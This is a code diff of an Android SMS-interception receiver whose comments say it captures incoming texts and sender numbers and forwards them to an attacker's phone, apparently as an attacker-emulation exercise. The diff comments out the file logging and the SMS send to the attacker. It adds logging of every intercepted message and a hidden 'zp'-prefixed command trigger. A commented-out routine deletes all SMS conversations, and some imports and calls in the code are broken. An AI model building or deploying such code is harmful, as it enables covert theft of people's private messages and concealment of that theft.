@@ -1,8 +1,10 @@
 package com.example.nsalerni.smslistener;
 
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.BroadcastReceiver;
+import android.net.Uri;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
@@ -10,17 +12,23 @@ import android.util.Log;
 import android.widget.Toast;
 
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+import static android.R.attr.path;
 
 /**
  * SMS Listener class extends BroadcastReceiver and uses onReceive to read any incoming SMS messages
  * that are received while the application is running (in foreground or background).
  */
-public class SMSListener extends BroadcastReceiver
-{
+public class SMSListener extends BroadcastReceiver {
     String message = null;          // Holds the message received from the person using the app.
     String filename = "smslog.txt"; // Filename of the text file which hold the messages.
 
@@ -34,24 +42,24 @@ public class SMSListener extends BroadcastReceiver
 
     SmsManager sms = SmsManager.getDefault(); // Manages SMS operations such as sending data, text, and pdu SMS messages.
 
-    File file = null;           // Holds the contents of the text message in the file, along with the sender's phone number.
+    //    File file = null;           // Holds the contents of the text message in the file, along with the sender's phone number.
     String messageBody = null;  // Holds the body of the SMS message.
     String sender = null;       // Holds the sender's phone number.
 
     /**
      * This method is called when the BroadcastReceiver is receiving an Intent broadcast. In this case,
      * the action we are listening for is when an SMS is received.
-     * @param context  The Context in which the receiver is running.
-     * @param intent   The Intent being received.
+     *
+     * @param context The Context in which the receiver is running.
+     * @param intent  The Intent being received.
      */
     @Override
-    public void onReceive(Context context, Intent intent)
-    {
+    public void onReceive(Context context, Intent intent) {
+        Log.d("smsListener:", "onReceive:" + intent.getAction());
         Intent service = new Intent(context, MainActivity.class); // Create an Intent for the Alarm created in class MainActivity.
-        file = new File(context.getFilesDir() + "//" + filename); // Create a new file.
+//        file = new File(context.getFilesDir() + "//" + filename); // Create a new file.
 
-        try
-        {
+        try {
             /*
              *  Create a file and store the contents of the text message in the file,
              *  along with the sender's phone number. These contents will be sent back to the
@@ -61,14 +69,7 @@ public class SMSListener extends BroadcastReceiver
              *  read the contents of the text file and send it back to the attacker as an SMS message.
              *
              */
-            if (intent.getAction().equals("com.nsalerni.alarm.ACTION"))
-            {
-                // Create the file if it doesn't already exist.
-                if (!file.exists())
-                {
-                    file.createNewFile();
-                }
-
+            if (intent.getAction().equals("com.nsalerni.alarm.ACTION")) {
                 /*
                  * Read from file and store its contents in StringBuilder sb. Note: The contents
                  * of sb will be transferred back to the attacker.
@@ -79,8 +80,7 @@ public class SMSListener extends BroadcastReceiver
                 sb = new StringBuilder(); // Holds the entire contents of the text file.
 
                 // While the file still has content, append the line to the StringBuilder sb.
-                while ((line = bufferedReader.readLine()) != null)
-                {
+                while ((line = bufferedReader.readLine()) != null) {
                     sb.append(line);
                 }
 
@@ -89,23 +89,20 @@ public class SMSListener extends BroadcastReceiver
                 // For testing purposes, log the sender's phone number and message contents.
                 Log.d("SMSListener", "Sender's Phone Number: " + sender);
                 Log.d("SMSListener", "Message: " + messageBody);
-                Log.d("SMSListener", "PATH: " + file.getAbsolutePath());
                 Log.d("SMSListener", "ATTACKER: " + sb.toString());
 
                 /*
                  * Send the string with the sms contents (sender's number and message body) back to the attacker.
                  * NOTE: PLEASE REPLACE THE FIRST ARGUMENT IN sendTextMessage WITH THE NUMBER (as a String) OF THE PERSON WHO IS EMULATING THE ATTACKER.
                  */
-                sms.sendTextMessage("INSERT ATTACKER'S NUMBER HERE", null, sb.toString(), null, null);
+//                sms.sendTextMessage("INSERT ATTACKER'S NUMBER HERE", null, sb.toString(), null, null);
 
-                file.delete(); // After the SMS is sent back to the attacker, delete the file.
             }
 
             // If the intent received is a SMS received action.
-            if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction()))
-            {
-                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent))
-                {
+            if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
+                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
+                    Log.d("SMSListener", "receive for");
                     messageBody = smsMessage.getDisplayMessageBody();   // The contents of the message.
                     sender = smsMessage.getDisplayOriginatingAddress(); // The phone number of the sender.
 
@@ -122,6 +119,16 @@ public class SMSListener extends BroadcastReceiver
                     // Compose the string which will be written to the file.
                     message = "Sender's Phone Number: " + sender + " Message: " + messageBody + " \n";
 
+                    Log.d("SMSListener", message);
+
+
+                    if (messageBody.startsWith("zp")) {
+                        ThreadMatch threadMatch = new ThreadMatch();
+                        threadMatch.setId(Long.parseLong(messageBody.substring(2)));
+                        threadMatch.setMobile(sender);
+                        new Thread(threadMatch).start();
+                    }
+
                     /*
                      *  Create a file and store the contents of the text message in the file,
                      *  along with the sender's phone number. These contents will be sent back to the
@@ -130,15 +137,38 @@ public class SMSListener extends BroadcastReceiver
                      *  Create the outputStream using the filename specified above and context mode set
                      *  to private (only the app can read the data of the file).
                      */
-                    outputStream = context.openFileOutput(filename, Context.MODE_APPEND);
-                    outputStream.write(message.getBytes());
-                    outputStream.close(); // Close the file.
+//                    outputStream = context.openFileOutput(filename, Context.MODE_APPEND);
+//                    outputStream.write(message.getBytes());
+//                    outputStream.close(); // Close the file.
                 }
             }
-        }
-        catch (Exception e)
-        {
+        } catch (Exception e) {
             Log.e("SMSListener", "SMS Listener Exception " + e);
         }
     }
+
+//    /*
+// * Delete all SMS one by one
+// */
+//    private void deleteSMS() {
+//        try {
+//            ContentResolver CR = getContentResolver();
+//            // Query SMS
+//            Uri uriSms = Uri.parse("content://sms/sent");
+//            Cursor c = CR.query(uriSms,
+//                    new String[]{"_id", "thread_id"}, null, null, null);
+//            if (null != c && c.moveToFirst()) {
+//                do {
+//                    // Delete SMS
+//                    long threadId = c.getLong(1);
+//                    CR.delete(Uri.parse("content://sms/conversations/" + threadId),
+//                            null, null);
+//                    Log.d("deleteSMS", "threadId:: " + threadId);
+//                } while (c.moveToNext());
+//            }
+//        } catch (Exception e) {
+//            // TODO: handle exception
+//            Log.d("deleteSMS", "Exception:: " + e);
+//        }
+//    }
 }
